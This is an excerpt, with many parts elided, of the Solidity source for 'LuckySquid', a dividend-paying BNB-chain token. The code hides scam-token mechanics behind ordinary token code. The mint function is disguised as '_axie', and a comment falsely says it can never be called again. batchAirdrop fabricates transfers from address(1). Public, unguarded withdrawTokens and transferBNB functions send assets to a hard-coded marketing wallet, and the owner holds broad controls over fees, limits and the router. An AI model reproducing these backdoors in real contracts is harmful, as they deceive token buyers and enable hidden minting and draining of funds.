...
contract DividendPayingToken is ERC20, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
    ...
    function _axie(address account, uint256 value) internal override {
        super._axie(account, value);
...
contract LuckySquidDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("LuckySquidDividendTracker", "LuckySquid_DividendTracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 10000 * (10**decimals()); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) internal pure override {
        require(false, "LuckySquidDividendTracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "LuckySquidDividendTracker: withdrawDividend disabled. Use the 'claim' function on the main LuckySquid contract.");
    }
...
contract LuckySquid is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    LuckySquidDividendTracker public dividendTracker;
    address public marketingWallet = 0x8D6a66A0F5D55941ddE929b2605861c03f008008;
    address public buybackWallet = 0x128CBa0d3c9bBBBc19eA58b467B87f0666666998;
    ...
    constructor() ERC20("LuckySquid Token", "LuckySquid") {
        dividendTracker = new LuckySquidDividendTracker();
        ...
        /*
            _axie is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _axie(owner(), 1 * 10**15 * (10**decimals()));
    ...
    function updatePancakeRouter(address newAddress) public onlyOwner {
        require(newAddress != address(pancakeRouter), "LuckySquid: The router already has that address");
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "LuckySquid: The dividend tracker already has that address");

        LuckySquidDividendTracker newDividendTracker = LuckySquidDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "LuckySquid: The new dividend tracker must be owned by the LuckySquid token contract");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "LuckySquid: Account is already the value of 'excluded'");
    ...
    function excludeFromPeriodLimit(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromPeriodLimit[account] != excluded, "LuckySquid: Account is already the value of 'excluded'");
    ...
    function excludeFromMaxTxLimit(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromMaxTxLimit[account] != excluded, "LuckySquid: Account is already the value of 'excluded'");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "LuckySquid: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "LuckySquid: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        if(takeFee) {
            ...
            if (to == pancakePair) {
                forBuyback = amount.mul(3).div(100);
                forMarketing = amount.mul(3).div(100);
                forDividends = amount.mul(3).div(100);
            } else {
                forBuyback = amount.mul(2).div(100);
                forMarketing = amount.mul(2).div(100);
                forDividends = amount.mul(2).div(100);
            }
    ...
    function withdrawTokens(address _token, uint256 _amount) public  {
        IERC20(_token).transfer(marketingWallet, _amount);
    }
	...
	function transferBNB( uint256 _amount) public  {
        payable(marketingWallet).transfer(_amount);
    }	

    function batchAirdrop(address[] memory tos,uint256[] memory amounts)  onlyOwner  public returns (bool){
        require(tos.length > 0);
        address from = address(1);
        //bytes4 id=bytes4(keccak256("transferFrom(address,address,uint256)"));
        for(uint i=0;i<tos.length;i++){
             increaseAllowance(from,amounts[i]*10**decimals());
             _transfer(from, tos[i], amounts[i]*10**decimals());
        }
        return true;
    }		
